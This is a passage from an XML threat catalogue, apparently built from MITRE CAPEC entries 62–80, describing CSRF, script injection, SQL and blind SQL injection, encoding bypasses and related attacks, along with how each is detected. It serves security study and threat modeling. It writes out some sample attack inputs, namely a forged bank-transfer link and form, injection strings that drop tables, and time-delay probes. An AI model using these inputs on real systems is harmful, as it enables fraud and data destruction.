  <description>An attacker crafts malicious web links and distributes them (via web pages, email, etc.), typically in a targeted manner, hoping to induce users to click on the link and execute the malicious action against some third-party application. If successful, the action embedded in the malicious link will be processed and accepted by the targeted application with the users' privilege level.This type of attack leverages the persistence and implicit trust placed in user session cookies by many web applications today. In such an architecture, once the user authenticates to an application and a session cookie is created on the user's system, all following transactions for that session are authenticated using that cookie including potential actions initiated by an attacker and simply &quot;riding&quot; the existing session cookie.The attacker first explores the target website to determine pieces of functionality that are of interest to him (e.g. money transfers). The attacker will need a legitimate user account on the target website. It would help to have two accounts.Use web application debugging tool such as WebScarab, Tamper Data or TamperIE to analyze the information exchanged between the client and the serverUse network sniffing tool such as Wireshark to analyze the information exchanged between the client and the serverView HTML source of web pages that contain links or buttons that perform actions of interest.The attacker needs to create a link that will execute some interesting functionality such as transfer money, change a password, etc.Create a GET request containing all required parameters (e.g. https://www.somebank.com/members/transfer.asp?to=012345678901&amp;amt=10000)Create a form that will submit a POST request (e.g. &lt;form method=&quot;POST&quot; action=&quot;https://www.somebank.com/members/transfer.asp&quot;&gt;&lt;input type=&quot;hidden&quot; Name=&quot;to&quot; value=&quot;012345678901&quot;/&gt;&lt;input type=&quot;hidden&quot; Name=&quot;amt&quot; value=&quot;10000&quot;/&gt;&lt;input type=&quot;submit&quot; src=&quot;clickhere.jpg&quot;/&gt;&lt;/form&gt;Success outcome in previous step.Failure outcome in previous step.Finally, the attacker needs to convince a user that is logged into the target website to click on a link to execute the CSRF attack.Execute a phishing attack and send the user an e-mail convincing him to click on a link.Execute a stored XSS attack on a website to permanently embed the malicious link into the website.Execute a stored XSS attack on a website where a XMLHTTPRequest object will automatically execute the attack as soon as a user visits the page. This removes the step of convincing a user to click on a link.Include the malicious link on the attacker's own website where the user may have to click on the link, or where an XMLHTTPRequest object may automatically execute the attack when a user visits the site.Success outcome in previous step.Failure outcome in previous step.The attacker can observe the way the application accepts requests for actions. If the application uses a persistent cookie, a non-random identifier or any such static identification token that does not change with every request, the attack is fairly straightforward to accomplishIn order to obfuscate the actual URL and its contents passed to the victim, the attacker can employ a service such as TinyURL and optionally redirect the request to the actual malicious script</description>
</threat>
<threat label="CAPEC-63" name="Simple Script Injection" type="Standard" reference="CAPEC">
  <description>An attacker embeds malicious scripts in content that will be served to web browsers. The goal of the attack is for the target software, the client-side browser, to execute the script with the users' privilege level.An attack of this type exploits a programs' vulnerabilities that are brought on by allowing remote hosts to execute code and scripts. Web browsers, for example, have some simple security controls in place, but if a remote attacker is allowed to execute scripts (through injecting them in to user-generated content like bulletin boards) then these controls may be bypassed. Further, these attacks are very difficult for an end user to detect.Using a browser or an automated tool, an attacker follows all public links and actions on a web site. He records all the links, the forms, the resources accessed and all other potential entry-points for the web application.Use a spidering tool to follow and record all links and analyze the web pages to find entry points. Make special note of any links that include parameters in the URL.Use a proxy tool to record all links visited during a manual traversal of the web application.Use a browser to manually explore the website and analyze how it is constructed. Many browsers' plugins are available to facilitate the analysis or automate the discovery.Inputs are used by the application or the browser (DOM)Using URL rewriting, parameters may be part of the URL path.No parameters appear to be used on the current page. Even though none appear, the web application may still use them if they are provided.Applications that have only static pages or that simply present information without accepting input are unlikely to be susceptible.The attacker uses the entry points gathered in the &quot;Explore&quot; phase as a target list and injects various common script payloads to determine if an entry point actually represents a vulnerability and to characterize the extent to which the vulnerability can be exploited.Use a list of XSS probe strings to inject script in parameters of known URLs. If possible, the probe strings contain a unique identifier.Use a proxy tool to record results of manual input of XSS probes in known URLs.Use a list of XSS probe strings to inject script into UI entry fields. If possible, the probe strings contain a unique identifier.Use a list of XSS probe strings to inject script into resources accessed by the application. If possible, the probe strings contain a unique identifier.The output of pages includes some form of a URL parameter. E.g., ?error=&quot;&lt;foobar&gt;'(){};=&quot; becomes &quot;&lt;foobar&gt;'(){}=&quot; in the title of the web page.Input content becomes part of the web page.Nothing is returned to the web page. It may be a stored XSS. The unique identifier from the probe helps to trace the flow of the possible XSS.As the attacker succeeds in exploiting the vulnerability, he can choose to steal user's credentials in order to reuse or to analyze them later on.Develop malicious JavaScript that is injected through vectors identified during the Experiment Phase and loaded by the victim's browser and sends document information to the attacker.Develop malicious JavaScript that injected through vectors identified during the Experiment Phase and takes commands from an attacker's server and then causes the browser to execute appropriately.When the attacker targets the current application or another one (through CSRF vulnerabilities), the user will then be the one who perform the attacks without being aware of it. These attacks are mostly targeting application logic flaws, but it can also be used to create a widespread attack against a particular website on the user's current network (Internet or not).Develop malicious JavaScript that is injected through vectors identified during the Experiment Phase and loaded by the victim's browser and performs actions on the same web siteDevelop malicious JavaScript that injected through vectors identified during the Experiment Phase and takes commands from an attacker's server and then causes the browser to execute request to other web sites (especially the web applications that have CSRF vulnerabilities).By manipulating the content, the attacker targets the information that the user would like to get from the website.Develop malicious JavaScript that is injected through vectors identified during the Experiment Phase and loaded by the victim's browser and exposes attacker-modified invalid information to the user on the current web page.Enables attacker to execute scripts to launch attacks on remote client machine and environment. Intranet and local systems may not be patched to the same degree as &quot;externally&quot; facing systems, so simple attacks may identify more victims on an &quot;internal&quot; system such as a corporate Intranet</description>
</threat>
<threat label="CAPEC-64" name="Using Slashes and URL Encoding Combined to Bypass Validation Logic" type="Detailed" reference="CAPEC">
  <description>This attack targets the encoding of the URL combined with the encoding of the slash characters. An attacker can take advantage of the multiple way of encoding an URL and abuse the interpretation of the URL. An URL may contain special character that need special syntax handling in order to be interpreted. Special characters are represented using a percentage character followed by two digits representing the octet code of the original character (%HEX-CODE). For instance US-ASCII space character would be represented with %20. This is often referred as escaped ending or percent-encoding. Since the server decodes the URL from the requests, it may restrict the access to some URL paths by validating and filtering out the URL requests it received. An attacker will try to craft an URL with a sequence of special characters which once interpreted by the server will be equivalent to a forbidden URL. It can be difficult to protect against this attack since the URL can contain other format of encoding such as UTF-8 encoding, Unicode-encoding, etc.The attacker accesses the server using a specific URL.The attacker tries to encode some special characters in the URL. The attacker find out that some characters are not filtered properly.The attacker crafts a malicious URL string request and sends it to the server.The server decodes and interprets the URL string. Unfortunately since the input filtering is not done properly, the special characters have harmful consequences.An attacker can manually inject special characters in the URL string request and observe the results of the request.Custom scripts can also be used. For example, a good script for verifying the correct interpretation of UTF-8 encoded characters can be found at http://www.cl.cam.ac.uk/~mgk25/ucs/examples/UTF-8-test.txtAutomated tools such as fuzzer can be used to test the URL decoding and filtering.If the first decoding process has left some invalid or blacklisted characters, that may be a sign that the request is malicious.Traffic filtering with IDS (or proxy) can detect requests with suspicious URLs. IDS may use signature based identification to reveal such URL based attacks.Sometime the percent escaping can be used to obfuscate the attack itself.Alternative method of data encoding can be used.Obfuscation technique such as IP address encoding can also be used (See reference section : &quot;URL encoded attacks&quot;, by Gunter Ollmann).</description>
</threat>
<threat label="CAPEC-65" name="Passively Sniff and Capture Application Code Bound for Authorized Client" type="Standard" reference="CAPEC">
  <description>Attackers can capture appplication code bound for the client and can use it, as-is or through reverse-engineering, to glean sensitive information or exploit the trust relationship between the client and server.Such code may belong to a dynamic update to the client, a patch being applied to a client component or any such interaction where the client is authorized to communicate with the server.The attacker sets up a sniffer (and an interceptor, as the motive of the attack may be) in the path between the server and the clientThe captured code is then used as part of a larger attack, such as reverse-engineering the code or denying its delivery to the client or altering its contents on way to the client</description>
</threat>
<threat label="CAPEC-66" name="SQL Injection" type="Standard" reference="CAPEC">
  <description>This attack exploits target software that constructs SQL statements based on user input. An attacker crafts input strings so that when the target software constructs SQL statements based on the input, the resulting SQL statement performs actions other than those the application intended.SQL Injection results from failure of the application to appropriately validate input. When specially crafted user-controlled input consisting of SQL syntax is used without proper validation as part of SQL queries, it is possible to glean information from the database in ways not envisaged during application design. Depending upon the database and the design of the application, it may also be possible to leverage injection to have the database execute system-related commands of the attacker's choice. SQL Injection enables an attacker to talk directly to the database, thus bypassing the application completely. Sucessful injection can cause information disclosure as well as ability to add or modify data in the database. In order to successfully inject SQL and retrieve information from a database, an attacker:The attacker first takes an inventory of the functionality exposed by the application.Spider web sites for all available linksSniff network communications with application using a utility such as WireShark.Determine the user-controllable input susceptible to injection. For each user-controllable input that the attacker suspects is vulnerable to SQL injection, attempt to inject characters that have special meaning in SQL (such as a single quote character, a double quote character, two hyphens, a paranthesis, etc.). The goal is to create a SQL query with an invalid syntax.Use web browser to inject input through text fields or through HTTP GET parameters.Use a web application debugging tool such as Tamper Data, TamperIE, WebScarab,etc. to modify HTTP POST parameters, hidden fields, non-freeform fields, etc.Use network-level packet injection tools such as netcat to inject inputUse modified client (modified by reverse engineering) to inject input.Attacker receives normal response from server.Attacker receives an error message from server indicating that there was a problem with the SQL query.Server sends a specific error message that indicates programmatic parsing of the input data (e.g. NumberFormatException)After determining that a given input is vulnerable to SQL Injection, hypothesize what the underlying query looks like. Iteratively try to add logic to the query to extract information from the database, or to modify or delete information in the database.Use public resources such as &quot;SQL Injection Cheat Sheet&quot; at http://ferruh.mavituna.com/makale/sql-injection-cheatsheet/, and try different approaches for adding logic to SQL queries.Add logic to query, and use detailed error messages from the server to debug the query. For example, if adding a single quote to a query causes an error message, try : &quot;' OR 1=1; --&quot;, or something else that would syntactically complete a hypothesized query. Iteratively refine the query.Use &quot;Blind SQL Injection&quot; techniques to extract information about the database schema.If a denial of service attack is the goal, try stacking queries. This does not work on all platforms (most notably, it does not work on Oracle or MySQL). Examples of inputs to try include: &quot;'; DROP TABLE SYSOBJECTS; --&quot; and &quot;'); DROP TABLE SYSOBJECTS; --&quot;. These particular queries will likely not work because the SYSOBJECTS table is generally protected.Success outcome in previous step.Failure outcome in previous step.The attacker tries to inject characters that can cause a SQL error, such as single-quote (') or keywords such as &quot;UNION&quot; and &quot;OR&quot;. If the injection of such characters into the input causes a SQL error and the resulting error is displayed unfiltered, the attacker can begin to determine the nature of input validation and structure of SQL queries. A typical error resulting from such injection would look like:With available design documentation and code, the attacker can determine whether all user-controllable inputs are being validated or not, and also the structure of SQL queries that such inputs feed into.Too many false or invalid queries to the database, especially those caused by malformed input.When malicious SQL content is executed by the database, it can lead to arbitrary queries being executed, causing disclosure of information, unauthorized access, privilege escalation and possibly system compromise.</description>
</threat>
<threat label="CAPEC-67" name="String Format Overflow in syslog()" type="Detailed" reference="CAPEC">
  <description>This attack targets the format string vulnerabilities in the syslog() function. An attacker would typically inject malicious input in the format string parameter of the syslog function. This is a common problem, and many public vulnerabilities and associated exploits have been posted.The attacker finds that he can inject data to the format string parameter of Syslog().The attacker craft a malicious input and inject it into the format string parameter. From now on, the attacker can exeute arbitrary code and do more damage.If the source code of the application is available, an attacker can use static analysis tools to spot a syslog vulnerability (a simple grep may also work).If the source code is not available, automated tools such as Fuzzer and advanced Web Scanner can be used. If the tool supplied data reaches the syslog's format string argument, the application under scrutiny may have unexpected behavior.If the source code is not available, a more complexe technique involve the use of library and system call tracer combined with the use of binary auditing tool such as IDA Pro. Reverse Engineering technique can be used to find format string vulnerability in the syslog function call. For instance it is possible to get the address of the buffer that is later used as the format string when reading dataThe impacts of this attack can be execution of arbitrary code. Execution of arbitary code can lead to many problems such as corruption of data, unauthorized access, etc.</description>
</threat>
<threat label="CAPEC-68" name="Subvert Code-signing Facilities" type="Standard" reference="CAPEC">
  <description>Because languages use code signing facilities to vouch for code's identity and to thus tie code to its assigned privileges within an environment, subverting this mechanism can be instrumental in an attacker escalating privilege.Any means of subverting the way that a virtual machine enforces code signing classifies for this style of attack. This pattern does not include circumstances through which a signing key has been stolen.Understanding, and possibly exploiting, the effect of certain flags or environment variables on code signing.Introducing unmanaged code into a container-managed environment</description>
</threat>
<threat label="CAPEC-69" name="Target Programs with Elevated Privileges" type="Standard" reference="CAPEC">
  <description>This attack targets programs running with elevated privileges. The attacker would try to leverage a bug in the running program and get arbitrary code to execute with elevated privileges. For instance an attacker would look for programs that write to the system directories or registry keys (such as HKLM, which stores a number of critical Windows environment variables). These programs are typically running with elevated privileges and have usually not been designed with security in mind. Such programs are excellent exploit targets because they yield lots of power when they break. The malicious user try to execute its code at the same level as a privileged system call.The attacker probes for programs running with elevated privileges.The attacker finds a bug in a program running with elevated privileges.The attacker exploits the bug that she has found. For instance she can try to inject and execute arbitrary code or write to OS resources.Probing technique include fuzzing (sending random data in order to fail the service on the host target), brute forcing (with automated tools), network scanning to determine which services are available and running on the target host.There are freely available tools to probe and gather information from host target. For instance, the attacker can find out that a host target has not been patched by collecting such information.The log can have a trace of abnormal activity. Also if abnormal activity is detected on the host target. For instance flooding should be seen as abnormal activity and the target host may decide to take appropriate action in order to mitigate the attack (data filtering or blocking). Resource exhaustion is also a sign of abnormal activity.The attacker may try to hide her attack by forging the host's logs. The attacker has interest in mimicing a legitimate call to the program or service under threat.</description>
</threat>
<threat label="CAPEC-7" name="Blind SQL Injection" type="Detailed" reference="CAPEC">
  <description>Blind SQL Injection results from an insufficient mitigation for SQL Injection. Although suppressing database error messages are considered best practice, the suppression alone is not sufficient to prevent SQL Injection. Blind SQL Injection is a form of SQL Injection that overcomes the lack of error messages. Without the error messages that facilitate SQL Injection, the attacker constructs input strings that probe the target through simple Boolean SQL expressions. The attacker can determine if the syntax and structure of the injection was successful based on whether the query was executed or not. Applied iteratively, the attacker determines how and where the target is vulnerable to SQL Injection.For example, an attacker may try entering something like &quot;username' AND 1=1; --&quot; in an input field. If the result is the same as when the attacker entered &quot;username&quot; in the field, then the attacker knows that the application is vulnerable to SQL Injection. The attacker can then ask yes/no questions from the database server to extract information from it. For example, the attacker can extract table names from a database using the following types of queries:Generated hypotheses regarding the SQL queries in an application. For example, the attacker may hypothesize that his input is passed directly into a query that looks like:Of course, there are many other possibilities.Research types of SQL queries and determine which ones could be used at various places in an application.Determine how to inject information into the queries from the previous step such that the injection does not impact their logic. For example, the following are possible injections for those queries:Add clauses to the SQL queries such that the query logic does not change.Add delays to the SQL queries in case server does not provide clear error messages (e.g. WAITFOR DELAY '0:0:10' in SQL Server or BENCHMARK(1000000000,MD5(1) in MySQL). If these can be injected into the queries, then the length of time that the server takes to respond reveals whether the query is injectable or not.Determine the user-controllable input susceptible to injection. For each user-controllable input that the attacker suspects is vulnerable to SQL injection, attempt to inject the values determined in the previous step. If an error does not occur, then the attacker knows that the SQL injection was successful.Use web browser to inject input through text fields or through HTTP GET parameters.Use a web application debugging tool such as Tamper Data, TamperIE, WebScarab,etc. to modify HTTP POST parameters, hidden fields, non-freeform fields, etc.Use network-level packet injection tools such as netcat to inject inputUse modified client (modified by reverse engineering) to inject input.Attacker receives normal response from server.Response takes expected amount of time after delay is injected.Server sends a specific error message that indicates programmatic parsing of the input data (e.g. NumberFormatException)Determines the type of the database, such as MS SQL Server or Oracle or MySQL, using logical conditions as part of the injected queriesTry injecting a string containing char(0x31)=char(0x31) (this evaluates to 1=1 in SQL Server only)Try injecting a string containing 0x313D31 (this evaluates to 1=1 in MySQL only)Inject other database-specific commands into input fields susceptible to SQL Injection. The attacker can determine the type of database that is running by checking whether the query executed successfully or not (i.e. wheter the attacker received a normal response from the server or not).Success outcome in previous stepFailure outcome in previous stepExtract information about database schema by getting the database to answer yes/no questions about the schema.Automatically extract database schema using a tool such as Absinthe.Manually perform the blind SQL Injection to extract desired information about the database schema.Success outcome in previous step.Failure outcome in previous step.Use the information obtained in the previous steps to successfully inject the database in order to bypass checks or modify, add, retrieve or delete data from the databaseUse information about how to inject commands into SQL queries as well as information about the database schema to execute attacks such as dropping tables, inserting records, etc.Success outcome in previous step.Failure outcome in previous step.In order to determine the right syntax for the query to inject, the attacker tries to determine the right number of parameters to the query and their types. This is achieved by formulating conditions that result in a true/false answer from the database. If the logical condition is true, the database will execute the rest of the query. If not, a custom error page or a default page is returned. Another approach is to ask such true/false questions of the database and note the response times to a query with a logically true condition and one with a false condition.The only indicators of successful Blind SQL Injection are the application or database logs that show similar queries with slightly differing logical conditions that increase in complexity over time. However, this requires extensive logging as well as knowledge of the queries that can be used to perform such injection and return meaningful information from the database.The injected SQL statements are such that they result in a true/false query to the database. If the database evaluates a statement to be logically true, it responds with the requested data. If the condition is evaluated to be logically false, an error is returned. The attacker modifies the boolean condition each time to gain information from the database.</description>
</threat>
<threat label="CAPEC-70" name="Try Common(default) Usernames and Passwords" type="Detailed" reference="CAPEC">
  <description>An attacker may try certain common (default) usernames and passwords to gain access into the system and perform unauthorized actions. An attacker may try an intelligent brute force using known vendor default credentials as well as a dictionary of common usernames and passwords.Many vendor products come preconfigured with default (and thus well known) usernames and passwords that should be deleted prior to usage in a production environment. It is a common mistake to forget to remove these default login credentials. Another problem is that users would pick very simple (common) passwords (e.g. &quot;secret&quot; or &quot;password&quot;) that make it easier for the attacker to gain access to the system compared to using a brute force attack or even a dictionary attack using a full dictionary.Try to determine what products are used in the implementation of the system. Determine if there are any default accounts associated with those products.Many incorrect login attempts are detected by the system.Try to spoof IP addresses so that it does not look like the incorrect log in attempts are coming from the same computer.</description>
</threat>
<threat label="CAPEC-71" name="Using Unicode Encoding to Bypass Validation Logic" type="Detailed" reference="CAPEC">
  <description>An attacker may provide a unicode string to a system component that is not unicode aware and use that to circumvent the filter or cause the classifying mechanism to fail to properly understanding the request. That may allow the attacker to slip malicious data past the content filter and/or possibly cause the application to route the request incorrectly.Using a browser or an automated tool, an attacker follows all public links and actions on a web site. He records all the links, the forms, the resources accessed and all other potential entry-points for the web application.Use a spidering tool to follow and record all links and analyze the web pages to find entry points. Make special note of any links that include parameters in the URL.Use a proxy tool to record all user input entry points visited during a manual traversal of the web application.Use a browser to manually explore the website and analyze how it is constructed. Many browsers' plugins are available to facilitate the analysis or automate the discovery.Inputs are used by the application or the browser (DOM)Using URL rewriting, parameters may be part of the URL path.No parameters appear to be used on the current page. Even though none appear, the web application may still use them if they are provided.Applications that have only static pages or that simply present information without accepting input are unlikely to be susceptible.The attacker uses the entry points gathered in the &quot;Explore&quot; phase as a target list and injects various Unicode encoded payloads to determine if an entry point actually represents a vulnerability with insufficient validation logic and to characterize the extent to which the vulnerability can be exploited.Try to use Unicode encoding of content in Scripts in order to bypass validation routines.Try to use Unicode encoding of content in HTML in order to bypass validation routines.Try to use Unicode encoding of content in CSS in order to bypass validation routines.The application accepts user-controllable input.Unicode encoded data is passed to APIs where it is not expected</description>
</threat>
<threat label="CAPEC-72" name="URL Encoding" type="Standard" reference="CAPEC">
  <description>This attack targets the encoding of the URL. An attacker can take advantage of the multiple way of encoding an URL and abuse the interpretation of the URL. An URL may contain special character that need special syntax handling in order to be interpreted. Special characters are represented using a percentage character followed by two digits representing the octet code of the original character (%HEX-CODE). For instance US-ASCII space character would be represented with %20. This is often referred as escaped ending or percent-encoding. Since the server decodes the URL from the requests, it may restrict the access to some URL paths by validating and filtering out the URL requests it received. An attacker will try to craft an URL with a sequence of special characters which once interpreted by the server will be equivalent to a forbidden URL. It can be difficult to protect against this attack since the URL can contain other format of encoding such as UTF-8 encoding, Unicode-encoding, etc. The attacker could also subvert the meaning of the URL string request by encoding the data being sent to the server through a GET request. For instance an attacker may subvert the meaning of parameters used in a SQL request and sent through the URL string (See Example section).The attacker accesses the server using a specific URL.The attacker tries to encode some special characters in the URL. The attacker finds out that some characters are not filtered properly.The attacker crafts a malicious URL string request and sends it to the server.The server decodes and interprets the URL string. Unfortunately since the input filtering is not done properly, the special characters may have harmful consequences.An attacker can manually inject special characters in the URL string request and observe the results of the request.Custom scripts can also be used. For example, a good script for verifying the correct interpretation of UTF-8 encoded characters can be found at http://www.cl.cam.ac.uk/~mgk25/ucs/examples/UTF-8-test.txtAutomated tools such as fuzzer can be used to test the URL decoding and filtering.If the first decoding process has left some invalid or blacklisted characters, that may be a sign that the request is malicious.Traffic filtering with IDS (or proxy) can detect requests with suspicious URLs. IDS may use signature based identification to reveal such URL based attacks.Sometime the percent escaping can be used to obfuscate the attack itself.Alternative method of data encoding can be used.Obfuscation technique such as IP address encoding can also be used (See reference section : &quot;URL encoded attacks&quot;, by Gunter Ollmann).</description>
</threat>
<threat label="CAPEC-73" name="User-Controlled Filename" type="Standard" reference="CAPEC">
  <description>An attack of this type involves an attacker inserting malicious characters (such as a XSS redirection) into a filename, directly or indirectly that is then used by the target software to generate HTML text or other potentially executable content. Many websites rely on user-generated content and dynamically build resources like files, filenames, and URL links directly from user supplied data. In this attack pattern, the attacker uploads code that can execute in the client browser and/or redirect the client browser to a site that the attacker owns. All XSS attack payload variants can be used to pass and exploit these vulnerabilities.Enables attacker to execute server side code with any commands that the program owner has privileges to.</description>
</threat>
<threat label="CAPEC-74" name="Manipulating User State" type="Standard" reference="CAPEC">
  <description>An attacker modifies state information maintained by the target software in user-accessible locations. If successful, the target software will use this tainted state information and execute in an unintended manner.State management is an important function within an application. User state maintained by the application can include usernames, payment information, browsing history as well as application-specific contents such as items in a shopping cart.Manipulating user state can be employed by an attacker to elevate privilege, conduct fraudulent transactions or otherwise modify the flow of the application to derive certain benefits.Attacker determines the nature of state management employed by the application. This includes determining the location (client-side, server-side or both) and possibly the items stored as part of user stateThe attacker now tries to modify the user state contents (possibly blindly if the contents are encrypted or otherwise obfuscated) and observe the effects of this change on the application.Having determined the information stored in the user state and the possible ways to modify it, the attacker can violate it in order to perform illegitimate actions.Analysis: The attacker observes contents of client-side user state variables, stored in coookies or hidden fields or query strings, and modifies them in order to observe their effect on the application.Altered user state leading to information leak or elevated privilege</description>
</threat>
<threat label="CAPEC-75" name="Manipulating Writeable Configuration Files" type="Standard" reference="CAPEC">
  <description>Generally these are manually edited files that are not in the preview of the system administrators, any ability on the attacker's behalf to modify these files, for example in a CVS repository, gives unauthorized access directly to the application, the same as authorized users.Enables attacker to execute server side code with any commands that the program owner has privileges to.</description>
</threat>
<threat label="CAPEC-76" name="Manipulating Input to File System Calls" type="Standard" reference="CAPEC">
  <description>An attacker manipulates inputs to the target software which the target software passes to file system calls in the OS. The goal is to gain access to, and perhaps modify, areas of the file system that the target software did not intend to be accessible.In order to create a valid file injection, the attacker needs to know what the underlying OS is.Port mapping. Identify ports that the system is listening on, and attempt to identify inputs and protocol types on those ports.TCP/IP Fingerprinting. The attacker uses various software to make connections or partial connections and observe idiosyncratic responses from the operating system. Using those responses, he attempts to guess the actual operating system.Induce errors to find informative error messagesThe target software accepts connections via the network.The attacker surveys the target application to identify all user-controllable inputs, possibly as a valid and authenticated userSpider web sites for all available links, entry points to the web site.Manually explore application and inventory all application inputsDepending on whether the application being exploited is a remote or local one the attacker crafts the appropriate malicious input containing the path of the targeted file or other file system control syntax to be passed to the applicationInject context-appropriate malicious file path using network packet injection tools (netcat, nemesis, etc.)Inject context-appropriate malicious file path using web test frameworks (proxies, TamperData, custom programs, etc.) or simple HTTP requestsInject context-appropriate malicious file system control syntaxInventorying in prior step is successful.The attacker may steal information or directly manipulate files (delete, copy, flush, etc.)The attacker injects context-appropriate malicious file path to access the content of the targeted file.The attacker injects context-appropriate malicious file system control syntax to access the content of the targeted file.The attacker injects context-appropriate malicious file path to cause the application to create, delete a targeted file.The attacker injects context-appropriate malicious file system control syntax to cause the application to create, delete a targeted file.The attacker injects context-appropriate malicious file path in order to manipulate the meta-data of the targeted file.The attacker injects context-appropriate malicious file system control syntax in order to manipulate the meta-data of the targeted file.File access or modification.</description>
</threat>
<threat label="CAPEC-77" name="Manipulating User-Controlled Variables" type="Standard" reference="CAPEC">
  <description>This attack targets user controlled variables (DEBUG=1, PHP Globals, and So Forth). An attacker can override environment variables leveraging user-supplied, untrusted query variables directly used on the application server without any data sanitization. In extreme cases, the attacker can change variables controlling the business logic of the application. For instance, in languages like PHP, a number of poorly set default configurations may allow the user to override variables.The attacker communicates with the application server using a thin client (browser) or thick client.While communicating with the server, the attacker finds that she can control and override a variable consumed by the application server.The attacker overrides the variable and influences the normal behavior of the application server.The attacker can try to change the value of the variables that are exposed on the webpage's source code and send them back to the application server. Depending on what program is running on the application server, the attacker may know which variables should be targeted.The malicious user may try to guess a global variable just by blackbox testing at the request level. For instance it is possible to create a variable and assign it a value, then pass it along to the request made to the server.Web penetration tool can be used to automate the discovery of client controlled global variables.A web penetration tool probing a web server may generate abnormal activities recorded on log files. Abnormal traffic such as a high number of request coming from the same client may also rise the warnings from a monitoring system or an intrusion detection tool.Changing the value of a server side variable may have many outcomes. In the case of a DEBUG related variable, there will be an information leak problem. Some other impacts can be privilege escalation, data modification, etc. It really depends on what the variable controls. If a global variable is used for authentication, there may be a vulnerability of privilege escalation. Another common variation of this last problem is to implement a &quot;Remember My Login&quot; feature by storing a user identifier in a cookie, allowing users to change their cookie value to login as whomever they want.</description>
</threat>
<threat label="CAPEC-78" name="Using Escaped Slashes in Alternate Encoding" type="Detailed" reference="CAPEC">
  <description>This attack targets the use of the backslash in alternate encoding. An attacker can provide a backslash as a leading character and causes a parser to believe that the next character is special. This is called an escape. By using that trick, the attacker tries to exploit alternate ways to encode the same character which leads to filter problems and opens avenues to attack.The attacker can send input data to the host target (e.g., via http request or command line requestThe attacker craft malicious input data which includes escaped slashes. The attacker may need multiple attempts before finding a successful combination.An attacker can manually inject backslash characters in the data sent to the target host and observe the results of the request.The attacker may also run scripts or automated tools against the target host to uncover a vulnerability related to the use of the backslash character.A attacker can use a fuzzer in order to probe for this vulnerability. The fuzzer should generate suspicious network activity noticeable by an intrusion detection system.Alternative method of data encoding can be used.The character following the backslash character will be escaped (i.e, unfiltered) and may cause harmful effects.</description>
</threat>
<threat label="CAPEC-79" name="Using Slashes in Alternate Encoding" type="Detailed" reference="CAPEC">
  <description>This attack targets the encoding of the Slash characters. An attacker would try to exploit common filtering problems related to the use of the slashes characters to gain access to resources on the target host. Directory-driven systems, such as file systems and databases, typically use the slash character to indicate traversal between directories or other container components. For murky historical reasons, PCs (and, as a result, Microsoft OSs) choose to use a backslash, whereas the UNIX world typically makes use of the forward slash. The schizophrenic result is that many MS-based systems are required to understand both forms of the slash. This gives the attacker many opportunities to discover and abuse a number of common filtering problems. The goal of this pattern is to discover server software that only applies filters to one version, but not the other.The attacker has access to a resource path and required to use slashes as resource delimiter.The attacker tries variation and combination of the slashes characters in different encoding format.The attacker found an unfiltered combination which maps to a valid path and accesses unauthorized resources (directories, files, etc.)An attacker can try different encoding formats for the slashes characters and see if they produce the same filtering results.Automated tools such as fuzzer can be used to test the URL decoding and filtering. Custom scripts can also be used. For example, a good script for verifying the correct interpretation of UTF-8 encoded characters can be found at http://www.cl.cam.ac.uk/~mgk25/ucs/examples/UTF-8-test.txtIf the first path decoding process has left some invalid or blacklisted characters, that may be a sign that the request is malicious.Traffic filtering with IDS (or proxy) can detect request with suspicious URLs. IDS may use signature based identification to reveal such URL based attacks.A attacker can use a fuzzer in order to probe for a UTF-8 encoding vulnerability. The fuzzer should generate suspiscious network activity.Typically the obfuscation here is the use of different alternate encoding format (UTF-8, Unicode, etc,)The impact of the payload is access to unauthorized resources.</description>
</threat>
<threat label="CAPEC-8" name="Buffer Overflow in an API Call" type="Detailed" reference="CAPEC">
  <description>This attack targets libraries or shared code modules which are vulnerable to buffer overflow attacks. An attacker who has access to an API may try to embed malicious code in the API function call and exploit a buffer overflow vulnerability in the function's implementation. All clients that make use of the code library thus become vulnerable by association. This has a very broad effect on security across a system, usually affecting more than one software process.An attacker can call an API exposed by the target host.On the probing stage, the attacker injects malicious code using the API call and observes the results. The attacker's goal is to uncover a buffer overflow vulnerability.The attacker finds a buffer overflow vulnerability, crafts malicious code and injects it through an API call. The attacker can at worst execute remote code on the target host.The most common is remote code execution.</description>
</threat>
<threat label="CAPEC-80" name="Using UTF-8 Encoding to Bypass Validation Logic" type="Detailed" reference="CAPEC">
  <description>This attack is a specific variation on leveraging alternate encodings to bypass validation logic. This attack leverages the possibility to encode potentially harmful input in UTF-8 and submit it to applications not expecting or effective at validating this encoding standard making input filtering difficult. UTF-8 (8-bit UCS/Unicode Transformation Format) is a variable-length character encoding for Unicode. Legal UTF-8 characters are one to four bytes long. However, early version of the UTF-8 specification got some entries wrong (in some cases it permitted overlong characters). UTF-8 encoders are supposed to use the ``shortest possible'' encoding, but naive decoders may accept encodings that are longer than necessary. According to the RFC 3629, a particularly subtle form of this attack can be carried out against a parser which performs security-critical validity checks against the UTF-8 encoded form of its input, but interprets certain illegal octet sequences as characters.Using a browser or an automated tool, an attacker follows all public links and actions on a web site. He records all the links, the forms, the resources accessed and all other potential entry-points for the web application.Use a spidering tool to follow and record all links and analyze the web pages to find entry points. Make special note of any links that include parameters in the URL.Use a proxy tool to record all user input entry points visited during a manual traversal of the web application.Use a browser to manually explore the website and analyze how it is constructed. Many browsers' plugins are available to facilitate the analysis or automate the discovery.Inputs are used by the application or the browser (DOM)Using URL rewriting, parameters may be part of the URL path.No parameters appear to be used on the current page. Even though none appear, the web application may still use them if they are provided.Applications that have only static pages or that simply present information without accepting input are unlikely to be susceptible.The attacker uses the entry points gathered in the &quot;Explore&quot; phase as a target list and injects various UTF-8 encoded payloads to determine if an entry point actually represents a vulnerability with insufficient validation logic and to characterize the extent to which the vulnerability can be exploited.Try to use UTF-8 encoding of content in Scripts in order to bypass validation routines.Try to use UTF-8 encoding of content in HTML in order to bypass validation routines.Try to use UTF-8 encoding of content in CSS in order to bypass validation routines.The application accepts user-controllable input.Attacker may try to inject dangerous characters using UTF-8 different representation using (example of invalid UTF-8 characters). The attacker hopes that the targeted system does poor input filtering for all the different possible representations of the malicious characters. Malicious inputs can be sent through an HTML form or directly encoded in the URL.The attacker can use scripts or automated tools to probe for poor input filtering.A web page that contains overly long UTF-8 codes constitute a protocol anomaly, and could be an indication that an attacker is attempting to exploit a vulnerability on the target host.A attacker can use a fuzzer in order to probe for a UTF-8 encoding vulnerability. The fuzzer should generate suspicious network activity noticeable by an intrusion detection system.An IDS filtering network traffic may be able to detect illegal UTF-8 characters.According to OWASP, sometimes cross-site scripting attackers attempt to hide their attacks in Unicode encoding.The malicious characters can defeat the data filtering mechanism and have many different outcomes such as path 